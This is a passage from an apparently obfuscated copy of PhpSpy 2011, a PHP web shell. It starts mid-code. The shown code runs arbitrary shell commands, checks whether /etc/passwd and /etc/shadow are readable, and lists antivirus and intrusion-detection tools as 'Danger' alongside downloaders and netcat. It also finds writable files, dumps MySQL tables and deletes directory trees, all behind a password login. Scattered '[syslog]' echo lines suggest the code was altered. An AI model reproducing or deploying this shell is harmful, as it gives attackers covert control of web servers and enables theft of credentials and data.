'); fclose($spa7a0b8[0]); while (!feof($spa7a0b8[1])) { echo fgets($spa7a0b8[1], 1024); } fclose($spa7a0b8[1]); while (!feof($spa7a0b8[2])) { echo fgets($spa7a0b8[2], 1024); } fclose($spa7a0b8[2]); proc_close($spe3df60); } } else { echo execute($sp2603de); } p('</pre>'); } } elseif ($spdeba40 == 'phpenv') { $sp7671d5 = getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed'; $sp77eb0b = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from'); !$sp239931 && ($sp239931 = 'No'); $sp35a580 = array(1 => array('Server Time', date('Y/m/d h:i:s', $sp73acdf)), 2 => array('Server Domain', $_SERVER['SERVER_NAME']), 3 => array('Server IP', gethostbyname($_SERVER['SERVER_NAME'])), 4 => array('Server OS', PHP_OS), 5 => array('Server OS Charset', $_SERVER['HTTP_ACCEPT_LANGUAGE']), 6 => array('Server Software', $_SERVER['SERVER_SOFTWARE']), 7 => array('Server Web Port', $_SERVER['SERVER_PORT']), 8 => array('PHP run mode', strtoupper(php_sapi_name())), 9 => array('The file path', __FILE__), 10 => array('PHP Version', PHP_VERSION), 11 => array('PHPINFO', IS_PHPINFO ? '<a href="javascript:g(\'phpinfo\');">Yes</a>' : 'No'), 12 => array('Safe Mode', getcfg('safe_mode')), 13 => array('Administrator', $sp77eb0b), 14 => array('allow_url_fopen', getcfg('allow_url_fopen')), 15 => array('enable_dl', getcfg('enable_dl')), 16 => array('display_errors', getcfg('display_errors')), 17 => array('register_globals', getcfg('register_globals')), 18 => array('magic_quotes_gpc', getcfg('magic_quotes_gpc')), 19 => array('memory_limit', getcfg('memory_limit')), 20 => array('post_max_size', getcfg('post_max_size')), 21 => array('upload_max_filesize', $sp7671d5), 22 => array('max_execution_time', getcfg('max_execution_time') . ' second(s)'), 23 => array('disable_functions', $sp239931)); if ($sp61c365) { m($sp61c365 . ' : ' . getcfg($sp61c365)); } formhead(array('title' => 'Server environment')); makehide('action', 'phpenv'); makeinput(array('title' => 'Please input PHP configuration parameter(eg:magic_quotes_gpc)', 'name' => 'phpvarname', 'value' => $sp61c365, 'newline' => 1)); formfooter(); $spb45abf = array(0 => 'Server', 1 => 'PHP'); for ($spd09f64 = 0; $spd09f64 < 2; $spd09f64++) { p('<h2>' . $spb45abf[$spd09f64] . ' &raquo;</h2>'); p('<ul class="info">'); if ($spd09f64 == 0) { for ($sp412bbc = 1; $sp412bbc <= 9; $sp412bbc++) { p('<li><u>' . $sp35a580[$sp412bbc][0] . ':</u>' . $sp35a580[$sp412bbc][1] . '</li>'); } } elseif ($spd09f64 == 1) { for ($sp412bbc = 10; $sp412bbc <= 23; $sp412bbc++) { p('<li><u>' . $sp35a580[$sp412bbc][0] . ':</u>' . $sp35a580[$sp412bbc][1] . '</li>'); } } p('</ul>'); } } elseif ($spdeba40 == 'secinfo') { secparam('Server software', @getenv('SERVER_SOFTWARE')); secparam('Disabled PHP Functions', $sp2eb6c3['disable_functions'] ? $sp2eb6c3['disable_functions'] : 'none'); secparam('Open base dir', @ini_get('open_basedir')); secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir')); secparam('Safe mode include dir', @ini_get('safe_mode_include_dir')); secparam('cURL support', function_exists('curl_version') ? 'enabled' : 'no'); $spc44fb2 = array(); if (function_exists('mysql_get_client_info')) { $spc44fb2[] = 'MySql (' . mysql_get_client_info() . ')'; } if (function_exists('mssql_connect')) { $spc44fb2[] = 'MSSQL'; } if (function_exists('pg_connect')) { $spc44fb2[] = 'PostgreSQL'; } if (function_exists('oci_connect')) { $spc44fb2[] = 'Oracle'; } secparam('Supported databases', implode(', ', $spc44fb2)); if (!IS_WIN) { $sp2d6efd = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl'); $spd109b3 = array('kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'clamd', 'rkhunter', 'chkrootkit', 'iptables', 'ipfw', 'tripwire', 'shieldcc', 'portsentry', 'snort', 'ossec', 'lidsadm', 'tcplodg', 'sxid', 'logcheck', 'logwatch', 'sysmask', 'zmbscap', 'sawmill', 'wormscan', 'ninja'); $sp2c68de = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror'); secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? 'yes' : 'no'); secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? 'yes' : 'no'); secparam('OS version', @file_get_contents('/proc/version')); secparam('Distr name', @file_get_contents('/etc/issue.net')); $spdda14d = @ini_get('safe_mode'); if (!$sp2eb6c3['safe_mode']) { $spc44fb2 = array(); foreach ($sp2d6efd as $sp527681) { if (which($sp527681)) { $spc44fb2[] = $sp527681; } } secparam('Userful', implode(', ', $spc44fb2)); $spc44fb2 = array(); foreach ($spd109b3 as $sp527681) { if (which($sp527681)) { $spc44fb2[] = $sp527681; } } secparam('Danger', implode(', ', $spc44fb2)); $spc44fb2 = array(); foreach ($sp2c68de as $sp527681) { if (which($sp527681)) { $spc44fb2[] = $sp527681; } } secparam('Downloaders', implode(', ', $spc44fb2)); secparam('Hosts', @file_get_contents('/etc/hosts')); secparam('HDD space', execute('df -h')); secparam('Mount options', @file_get_contents('/etc/fstab')); } } else { secparam('OS Version', execute('ver')); secparam('Account Settings', execute('net accounts')); secparam('User Accounts', execute('net user')); secparam('IP Configurate', execute('ipconfig -all')); } } else { m('Undefined Action'); } ?>
</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
	<span style="float:right;"><?php  debuginfo(); ob_end_flush(); ?>
</span>
	Powered by <a title="Build 20110502" href="http://www.4ngel.net" target="_blank"><?php  echo str_replace('.', '', 'P.h.p.S.p.y'); ?>
 2011</a>. Copyright (C) 2004-2011 <a href="http://www.4ngel.net" target="_blank">Security Angel Team [S4T]</a> All Rights Reserved.
</div>
</body>
</html>

<?php  function secparam($sp5c3411, $sp6d4391) { $sp6d4391 = trim($sp6d4391); if ($sp6d4391) { p('<h2>' . $sp5c3411 . ' &raquo;</h2>'); p('<div class="infolist">'); if (strpos($sp6d4391, '
') === false) { p($sp6d4391 . '<br />'); } else { p('<pre>' . $sp6d4391 . '</pre>'); } p('</div>'); } } function m($spcb2190) { echo '<div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">'; echo $spcb2190; echo '</div>'; } function scookie($sp7ac89e, $sp8e17b7, $spdfa613 = 0, $spc3d592 = 1) { global $sp73acdf, $_SERVER, $spcd0068, $sp3049a2, $sp63c1d6, $sp30b778; $sp7ac89e = ($spc3d592 ? $spcd0068 : '') . $sp7ac89e; $spdfa613 = $spdfa613 ? $spdfa613 : $sp30b778; $spc4a2f0 = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0; setcookie($sp7ac89e, $sp8e17b7, $sp73acdf + $spdfa613, $sp63c1d6, $sp3049a2, $spc4a2f0); } function multi($sp6cf735, $spd4ba3f, $spb4756d, $sp397cb0) { $sp0ef07d = ''; if ($sp6cf735 > $spd4ba3f) { $spb45fd2 = 10; $spc6ade9 = 5; $sp9c43a9 = @ceil($sp6cf735 / $spd4ba3f); if ($spb45fd2 > $sp9c43a9) { $sp96ebf9 = 1; $sp11e3c2 = $sp9c43a9; } else { $sp96ebf9 = $spb4756d - $spc6ade9; $sp11e3c2 = $spb4756d + $spb45fd2 - $spc6ade9 - 1; if ($sp96ebf9 < 1) { $sp11e3c2 = $spb4756d + 1 - $sp96ebf9; $sp96ebf9 = 1; if ($sp11e3c2 - $sp96ebf9 < $spb45fd2 && $sp11e3c2 - $sp96ebf9 < $sp9c43a9) { $sp11e3c2 = $spb45fd2; } } elseif ($sp11e3c2 > $sp9c43a9) { $sp96ebf9 = $spb4756d - $sp9c43a9 + $sp11e3c2; $sp11e3c2 = $sp9c43a9; if ($sp11e3c2 - $sp96ebf9 < $spb45fd2 && $sp11e3c2 - $sp96ebf9 < $sp9c43a9) { $sp96ebf9 = $sp9c43a9 - $spb45fd2 + 1; } } } $sp0ef07d = ($spb4756d - $spc6ade9 > 1 && $sp9c43a9 > $spb45fd2 ? '<a href="javascript:settable(\'' . $sp397cb0 . '\', \'\', 1);">First</a> ' : '') . ($spb4756d > 1 ? '<a href="javascript:settable(\'' . $sp397cb0 . '\', \'\', ' . ($spb4756d - 1) . ');">Prev</a> ' : ''); for ($sp412bbc = $sp96ebf9; $sp412bbc <= $sp11e3c2; $sp412bbc++) { $sp0ef07d .= $sp412bbc == $spb4756d ? $sp412bbc . ' ' : '<a href="javascript:settable(\'' . $sp397cb0 . '\', \'\', ' . $sp412bbc . ');">[' . $sp412bbc . ']</a> '; } $sp0ef07d .= ($spb4756d < $sp9c43a9 ? '<a href="javascript:settable(\'' . $sp397cb0 . '\', \'\', ' . ($spb4756d + 1) . ');">Next</a>' : '') . ($sp11e3c2 < $sp9c43a9 ? ' <a href="javascript:settable(\'' . $sp397cb0 . '\', \'\', ' . $sp9c43a9 . ');">Last</a>' : ''); $sp0ef07d = $sp0ef07d ? '<p>Pages: ' . $sp0ef07d . '</p>' : ''; } return $sp0ef07d; } function loginpage() { ?>
	<style type="text/css">
	input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
	</style>
	<form method="POST" action="">
	<span style="font:11px Verdana;">Password: </span><input name="password" type="password" size="20">
	<input type="hidden" name="action" value="login">
	<input type="submit" value="Login">
	</form>
<?php  die; } echo '[syslog]07
'; function execute($sp80c7e6) { $sp8e5eb2 = ''; if ($sp80c7e6) { if (function_exists('system')) { @ob_start(); @system($sp80c7e6); $sp8e5eb2 = @ob_get_contents(); @ob_end_clean(); } elseif (function_exists('passthru')) { @ob_start(); @passthru($sp80c7e6); $sp8e5eb2 = @ob_get_contents(); @ob_end_clean(); } elseif (function_exists('shell_exec')) { $sp8e5eb2 = @shell_exec($sp80c7e6); } elseif (function_exists('exec')) { @exec($sp80c7e6, $sp8e5eb2); $sp8e5eb2 = join('
', $sp8e5eb2); } elseif (@is_resource($sp1b2b3c = @popen($sp80c7e6, 'r'))) { $sp8e5eb2 = ''; while (!@feof($sp1b2b3c)) { $sp8e5eb2 .= @fread($sp1b2b3c, 1024); } @pclose($sp1b2b3c); } } return $sp8e5eb2; } function which($sp60b0db) { $sp149c6d = execute("which {$sp60b0db}"); return $sp149c6d ? $sp149c6d : $sp60b0db; } function cf($spd106ba, $spcc3eaa) { if ($spe0ea16 = @fopen($spd106ba, 'w')) { @fputs($spe0ea16, @base64_decode($spcc3eaa)); @fclose($spe0ea16); } } function dirsize($spee51b5) { $spcfdfd7 = @opendir($spee51b5); $spbb5bfd = 0; while ($sp7ff75d = @readdir($spcfdfd7)) { if ($sp7ff75d != '.' && $sp7ff75d != '..') { $sp149c6d = $spee51b5 . '/' . $sp7ff75d; $spbb5bfd += @is_dir($sp149c6d) ? dirsize($sp149c6d) : @filesize($sp149c6d); } } @closedir($spcfdfd7); return $spbb5bfd; } function debuginfo() { global $spd725d3; $sp875595 = explode(' ', microtime()); $spb293a9 = number_format($sp875595[1] + $sp875595[0] - $spd725d3, 6); echo 'Processed in ' . $spb293a9 . ' second(s)'; } function mydbconn($sp342aef, $spe1f996, $spc9e959, $sp50c961 = '', $sp093c94 = '', $spb97ae1 = '3306') { global $spb669c1; @ini_set('mysql.connect_timeout', 5); if (!($sp5fd284 = @mysql_connect($sp342aef . ':' . $spb97ae1, $spe1f996, $spc9e959))) { p('<h2>Can not connect to MySQL server</h2>'); die; } if ($sp5fd284 && $sp50c961) { if (!@mysql_select_db($sp50c961, $sp5fd284)) { p('<h2>Database selected has error</h2>'); die; } } if ($sp5fd284 && mysql_get_server_info() > '4.1') { if ($sp093c94 && in_array(strtolower($sp093c94), $spb669c1)) { q("SET character_set_connection={$sp093c94}, character_set_results={$sp093c94}, character_set_client=binary;", $sp5fd284); } } return $sp5fd284; } function s_array(&$sp026f8c) { if (is_array($sp026f8c)) { foreach ($sp026f8c as $sp8db113 => $sp6d4391) { $sp026f8c[$sp8db113] = s_array($sp6d4391); } } else { if (is_string($sp026f8c)) { $sp026f8c = stripslashes($sp026f8c); } } return $sp026f8c; } function html_clean($sp4c8f1b) { $sp4c8f1b = htmlspecialchars($sp4c8f1b); $sp4c8f1b = str_replace('
', '<br />', $sp4c8f1b); $sp4c8f1b = str_replace('  ', '&nbsp;&nbsp;', $sp4c8f1b); $sp4c8f1b = str_replace('	', '&nbsp;&nbsp;&nbsp;&nbsp;', $sp4c8f1b); return $sp4c8f1b; } function getChmod($sp256f71) { return substr(base_convert(@fileperms($sp256f71), 10, 8), -4); } function getPerms($sp256f71) { $sp3fd77e = @fileperms($sp256f71); if (($sp3fd77e & 49152) === 49152) { $spa48979 = 's'; } elseif (($sp3fd77e & 16384) === 16384) { $spa48979 = 'd'; } elseif (($sp3fd77e & 40960) === 40960) { $spa48979 = 'l'; } elseif (($sp3fd77e & 32768) === 32768) { $spa48979 = '-'; } elseif (($sp3fd77e & 24576) === 24576) { $spa48979 = 'b'; } elseif (($sp3fd77e & 8192) === 8192) { $spa48979 = 'c'; } elseif (($sp3fd77e & 4096) === 4096) { $spa48979 = 'p'; } else { $spa48979 = '?'; } $sp9f8c07['read'] = $sp3fd77e & 256 ? 'r' : '-'; $sp9f8c07['write'] = $sp3fd77e & 128 ? 'w' : '-'; $sp9f8c07['execute'] = $sp3fd77e & 64 ? 'x' : '-'; $sp103103['read'] = $sp3fd77e & 32 ? 'r' : '-'; $sp103103['write'] = $sp3fd77e & 16 ? 'w' : '-'; $sp103103['execute'] = $sp3fd77e & 8 ? 'x' : '-'; $spbc6618['read'] = $sp3fd77e & 4 ? 'r' : '-'; $spbc6618['write'] = $sp3fd77e & 2 ? 'w' : '-'; $spbc6618['execute'] = $sp3fd77e & 1 ? 'x' : '-'; if ($sp3fd77e & 2048) { $sp9f8c07['execute'] = $sp9f8c07['execute'] == 'x' ? 's' : 'S'; } if ($sp3fd77e & 1024) { $sp103103['execute'] = $sp103103['execute'] == 'x' ? 's' : 'S'; } if ($sp3fd77e & 512) { $spbc6618['execute'] = $spbc6618['execute'] == 'x' ? 't' : 'T'; } return $spa48979 . $sp9f8c07['read'] . $sp9f8c07['write'] . $sp9f8c07['execute'] . $sp103103['read'] . $sp103103['write'] . $sp103103['execute'] . $spbc6618['read'] . $spbc6618['write'] . $spbc6618['execute']; } function getUser($sp256f71) { if (function_exists('posix_getpwuid')) { $sp026f8c = @posix_getpwuid(@fileowner($sp256f71)); if ($sp026f8c && is_array($sp026f8c)) { return ' / <a href="#" title="User: ' . $sp026f8c['name'] . '&#13&#10Passwd: ' . $sp026f8c['passwd'] . '&#13&#10Uid: ' . $sp026f8c['uid'] . '&#13&#10gid: ' . $sp026f8c['gid'] . '&#13&#10Gecos: ' . $sp026f8c['gecos'] . '&#13&#10Dir: ' . $sp026f8c['dir'] . '&#13&#10Shell: ' . $sp026f8c['shell'] . '">' . $sp026f8c['name'] . '</a>'; } } return ''; } function deltree($spff8e42) { $sp5e742e = @dir($spff8e42); while ($sp7ff75d = $sp5e742e->read()) { if (is_dir($spff8e42 . '/' . $sp7ff75d) && $sp7ff75d != '.' && $sp7ff75d != '..') { @chmod($spff8e42 . '/' . $sp7ff75d, 511); deltree($spff8e42 . '/' . $sp7ff75d); } if (is_file($spff8e42 . '/' . $sp7ff75d)) { @chmod($spff8e42 . '/' . $sp7ff75d, 511); @unlink($spff8e42 . '/' . $sp7ff75d); } } $sp5e742e->close(); @chmod($spff8e42, 511); return @rmdir($spff8e42) ? 1 : 0; } function bg() { global $spc7200c; return $spc7200c++ % 2 == 0 ? 'alt1' : 'alt2'; } function getPath($spab7c39, $sp0c30a0) { if ($sp0c30a0 == '.') { $sp0c30a0 = $spab7c39; } $sp0c30a0 = str_replace('\\', '/', $sp0c30a0); $sp0c30a0 = str_replace('//', '/', $sp0c30a0); if (substr($sp0c30a0, -1) != '/') { $sp0c30a0 = $sp0c30a0 . '/'; } return $sp0c30a0; } function getUpPath($sp0c30a0) { $sp60e6c0 = explode('/', $sp0c30a0); $sp6cf735 = count($sp60e6c0); if ($sp6cf735 > 2) { unset($sp60e6c0[$sp6cf735 - 1], $sp60e6c0[$sp6cf735 - 2]); } $sp86e64a = implode('/', $sp60e6c0) . '/'; $sp86e64a = str_replace('//', '/', $sp86e64a); return $sp86e64a; } function getcfg($spd53bce) { $spb7d120 = 'treu'; if ($spb7d120 == 0) { return 'No'; } elseif ($spb7d120 == 1) { return 'Yes'; } else { return $spb7d120; } } function getfun($spcc8da3) { return false !== function_exists($spcc8da3) ? 'Yes' : 'No'; } function getext($sp7ff75d) { $sp35a580 = pathinfo($sp7ff75d); return $sp35a580['extension']; } echo '[syslog]08
'; function GetWDirList($spee51b5) { global $spbf846d, $sp460372, $sp0c30a0; !$sp460372 && ($sp460372 = 1); if ($spcfdfd7 = opendir($spee51b5)) { while ($sp7ff75d = readdir($spcfdfd7)) { $sp1b2b3c = str_replace('//', '/', $spee51b5 . '/' . $sp7ff75d); if ($sp7ff75d != '.' && $sp7ff75d != '..' && is_dir($sp1b2b3c)) { if (is_writable($sp1b2b3c)) { $spbf846d[$sp460372]['filename'] = str_replace($sp0c30a0, '', $sp1b2b3c); $spbf846d[$sp460372]['mtime'] = @date('Y-m-d H:i:s', filemtime($sp1b2b3c)); $spbf846d[$sp460372]['dirchmod'] = getChmod($sp1b2b3c); $spbf846d[$sp460372]['dirperm'] = getPerms($sp1b2b3c); $spbf846d[$sp460372]['dirlink'] = $spee51b5; $spbf846d[$sp460372]['server_link'] = $sp1b2b3c; $sp460372++; } GetWDirList($sp1b2b3c); } } closedir($spcfdfd7); clearstatcache(); return $spbf846d; } else { return array(); } } function GetWFileList($spee51b5) { global $spf393a1, $sp460372, $sp0c30a0, $spd8449c; !$sp460372 && ($sp460372 = 1); if ($spcfdfd7 = opendir($spee51b5)) { while ($sp7ff75d = readdir($spcfdfd7)) { $sp6d6a7e = getext($sp7ff75d); $sp1b2b3c = str_replace('//', '/', $spee51b5 . '/' . $sp7ff75d); if ($sp7ff75d != '.' && $sp7ff75d != '..' && is_dir($sp1b2b3c)) { GetWFileList($sp1b2b3c); } elseif ($sp7ff75d != '.' && $sp7ff75d != '..' && is_file($sp1b2b3c) && in_array($sp6d6a7e, explode(',', $spd8449c))) { if (is_writable($sp1b2b3c)) { $spf393a1[$sp460372]['filename'] = str_replace($sp0c30a0, '', $sp1b2b3c); $spf393a1[$sp460372]['size'] = sizecount(@filesize($sp1b2b3c)); $spf393a1[$sp460372]['mtime'] = @date('Y-m-d H:i:s', filemtime($sp1b2b3c)); $spf393a1[$sp460372]['filechmod'] = getChmod($sp1b2b3c); $spf393a1[$sp460372]['fileperm'] = getPerms($sp1b2b3c); $spf393a1[$sp460372]['fileowner'] = getUser($sp1b2b3c); $spf393a1[$sp460372]['dirlink'] = $spee51b5; $spf393a1[$sp460372]['server_link'] = $sp1b2b3c; $sp460372++; } } } closedir($spcfdfd7); clearstatcache(); return $spf393a1; } else { return array(); } } function GetSFileList($spee51b5, $sp4c8f1b, $sp9167bb = 0) { echo '[syslog]09_f
'; global $spf393a1, $sp460372, $sp0c30a0, $spd8449c; !$sp460372 && ($sp460372 = 1); if ($spcfdfd7 = opendir($spee51b5)) { while ($sp7ff75d = readdir($spcfdfd7)) { $sp6d6a7e = getext($sp7ff75d); $sp1b2b3c = str_replace('//', '/', $spee51b5 . '/' . $sp7ff75d); if ($sp7ff75d != '.' && $sp7ff75d != '..' && is_dir($sp1b2b3c)) { GetSFileList($sp1b2b3c, $sp4c8f1b, $sp9167bb = 0); } elseif ($sp7ff75d != '.' && $sp7ff75d != '..' && is_file($sp1b2b3c) && in_array($sp6d6a7e, explode(',', $spd8449c))) { $sp4f8dbd = 0; if ($sp9167bb) { if (preg_match('@' . $sp4c8f1b . '@', $sp7ff75d) || preg_match('@' . $sp4c8f1b . '@', @file_get_contents($sp1b2b3c))) { $sp4f8dbd = 1; } } else { if (strstr($sp7ff75d, $sp4c8f1b) || strstr(@file_get_contents($sp1b2b3c), $sp4c8f1b)) { $sp4f8dbd = 1; } } if ($sp4f8dbd) { $spf393a1[$sp460372]['filename'] = str_replace($sp0c30a0, '', $sp1b2b3c); $spf393a1[$sp460372]['size'] = sizecount(@filesize($sp1b2b3c)); $spf393a1[$sp460372]['mtime'] = @date('Y-m-d H:i:s', filemtime($sp1b2b3c)); $spf393a1[$sp460372]['filechmod'] = getChmod($sp1b2b3c); $spf393a1[$sp460372]['fileperm'] = getPerms($sp1b2b3c); $spf393a1[$sp460372]['fileowner'] = getUser($sp1b2b3c); $spf393a1[$sp460372]['dirlink'] = $spee51b5; $spf393a1[$sp460372]['server_link'] = $sp1b2b3c; $sp460372++; } } } closedir($spcfdfd7); clearstatcache(); return $spf393a1; } else { return array(); } } function qy($sp2f57d0) { global $sp3c234c; $sp8e5eb2 = $spd7253e = ''; if (!($sp8e5eb2 = @mysql_query($sp2f57d0, $sp3c234c))) { return 0; } else { if (is_resource($sp8e5eb2)) { return 1; } else { return 2; } } return 0; } function q($sp2f57d0) { global $sp3c234c; return @mysql_query($sp2f57d0, $sp3c234c); } function fr($sp8d2d56) { mysql_free_result($sp8d2d56); } function sizecount($sp9f2c7f) { $spbb5bfd = sprintf('%u', $sp9f2c7f); if ($spbb5bfd == 0) { return '0 Bytes'; } $sp251631 = array(' Bytes', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB'); return round($spbb5bfd / pow(1024, $sp412bbc = floor(log($spbb5bfd, 1024))), 2) . $sp251631[$sp412bbc]; } function sqldumptable($sp110772, $spe0ea16 = 0) { global $sp3c234c; $sp9a1ce3 = "DROP TABLE IF EXISTS `{$sp110772}`;\n"; $sp8e5eb2 = q("SHOW CREATE TABLE {$sp110772}"); $spe8e7e2 = mysql_fetch_row($sp8e5eb2); $sp9a1ce3 .= $spe8e7e2[1] . ';

'; if ($spe0ea16) { fwrite($spe0ea16, $sp9a1ce3); } else { echo $sp9a1ce3; } $sp9a1ce3 = ''; $sp5183f2 = q("SELECT * FROM {$sp110772}"); while ($spa596f1 = mysql_fetch_assoc($sp5183f2)) { foreach ($spa596f1 as $sp8db113 => $sp6d4391) { $spa596f1[$sp8db113] = '\'' . @mysql_real_escape_string($sp6d4391) . '\''; } $sp9a1ce3 = 'INSERT INTO `' . $sp110772 . '` VALUES (' . implode(', ', $spa596f1) . ');' . '
'; if ($spe0ea16) { fwrite($spe0ea16, $sp9a1ce3); } else { echo $sp9a1ce3; } } fwrite($spe0ea16, '

'); fr($sp5183f2); } function p($sp1ae2ba) { echo $sp1ae2ba . '
'; } function tbhead() { p('<table width="100%" border="0" cellpadding="4" cellspacing="0">'); } function tbfoot() { p('</table>'); } function makehide($spd86858, $sp8e17b7 = '') { p("<input id=\"{$spd86858}\" type=\"hidden\" name=\"{$spd86858}\" value=\"{$sp8e17b7}\" />"); } function makeinput($spa3abbf = array()) { $spa3abbf['size'] = $spa3abbf['size'] > 0 ? "size=\"{$spa3abbf['size']}\"" : 'size="100"'; $spa3abbf['extra'] = $spa3abbf['extra'] ? $spa3abbf['extra'] : ''; !$spa3abbf['type'] && ($spa3abbf['type'] = 'text'); $spa3abbf['title'] = $spa3abbf['title'] ? $spa3abbf['title'] . '<br />' : ''; $spa3abbf['class'] = $spa3abbf['class'] ? $spa3abbf['class'] : 'input'; if ($spa3abbf['newline']) { p("<p>{$spa3abbf['title']}<input class=\"{$spa3abbf['class']}\" name=\"{$spa3abbf['name']}\" id=\"{$spa3abbf['name']}\" value=\"{$spa3abbf['value']}\" type=\"{$spa3abbf['type']}\" {$spa3abbf['size']} {$spa3abbf['extra']} /></p>"); } else { p("{$spa3abbf['title']}<input class=\"{$spa3abbf['class']}\" name=\"{$spa3abbf['name']}\" id=\"{$spa3abbf['name']}\" value=\"{$spa3abbf['value']}\" type=\"{$spa3abbf['type']}\" {$spa3abbf['size']} {$spa3abbf['extra']} />"); } } function makeselect($spa3abbf = array()) { if ($spa3abbf['onchange']) { $sp203682 = 'onchange="' . $spa3abbf['onchange'] . '"'; } $spa3abbf['title'] = $spa3abbf['title'] ? $spa3abbf['title'] : ''; if ($spa3abbf['newline']) { p('<p>'); } p("{$spa3abbf['title']} <select class=\"input\" id=\"{$spa3abbf['name']}\" name=\"{$spa3abbf['name']}\" {$sp203682}>"); if (is_array($spa3abbf['option'])) { if ($spa3abbf['nokey']) { foreach ($spa3abbf['option'] as $sp8e17b7) { if ($spa3abbf['selected'] == $sp8e17b7) { p("<option value=\"{$sp8e17b7}\" selected>{$sp8e17b7}</option>"); } else { p("<option value=\"{$sp8e17b7}\">{$sp8e17b7}</option>"); } } } else { foreach ($spa3abbf['option'] as $sp7ac89e => $sp8e17b7) { if ($spa3abbf['selected'] == $sp7ac89e) { p("<option value=\"{$sp7ac89e}\" selected>{$sp8e17b7}</option>"); } else { p("<option value=\"{$sp7ac89e}\">{$sp8e17b7}</option>"); } } } } p('</select>'); if ($spa3abbf['newline']) { p('</p>'); } } function formhead($spa3abbf = array()) { global $spb6c8e7; !$spa3abbf['method'] && ($spa3abbf['method'] = 'post'); !$spa3abbf['action'] && ($spa3abbf['action'] = $spb6c8e7); $spa3abbf['target'] = $spa3abbf['target'] ? "target=\"{$spa3abbf['target']}\"" : ''; !$spa3abbf['name'] && ($spa3abbf['name'] = 'form1'); p("<form name=\"{$spa3abbf['name']}\" id=\"{$spa3abbf['name']}\" action=\"{$spa3abbf['action']}\" method=\"{$spa3abbf['method']}\" {$spa3abbf['target']}>"); if ($spa3abbf['title']) { p('<h2>' . $spa3abbf['title'] . ' &raquo;</h2>'); } } function maketext($spa3abbf = array()) { !$spa3abbf['cols'] && ($spa3abbf['cols'] = 100); !$spa3abbf['rows'] && ($spa3abbf['rows'] = 25); $spa3abbf['title'] = $spa3abbf['title'] ? $spa3abbf['title'] . '<br />' : ''; p("<p>{$spa3abbf['title']}<textarea class=\"area\" id=\"{$spa3abbf['name']}\" name=\"{$spa3abbf['name']}\" cols=\"{$spa3abbf['cols']}\" rows=\"{$spa3abbf['rows']}\" {$spa3abbf['extra']}>{$spa3abbf['value']}</textarea></p>"); } function formfooter($spd86858 = '') { !$spd86858 && ($spd86858 = 'submit'); p('<p><input class="bt" name="' . $spd86858 . '" id="' . $spd86858 . '" type="submit" value="Submit"></p>'); p('</form>'); } function goback() { global $spb6c8e7, $sp0c30a0; p('<form action="' . $spb6c8e7 . '" method="post"><input type="hidden" name="action" value="file" /><input type="hidden" name="dir" value="' . $sp0c30a0 . '" /><p><input class="bt" type="submit" value="Go back..."></p></form>'); } function formfoot() { p('</form>'); } function encode_pass($sp7ceca3) { $sp7ceca3 = md5('angel' . $sp7ceca3); $sp7ceca3 = md5($sp7ceca3 . 'angel'); $sp7ceca3 = md5('angel' . $sp7ceca3 . 'angel'); return $sp7ceca3; } function pr($sp1acd5c) { echo '<pre>' . print_r($sp1acd5c) . '</pre>'; } echo '[syslog]10
';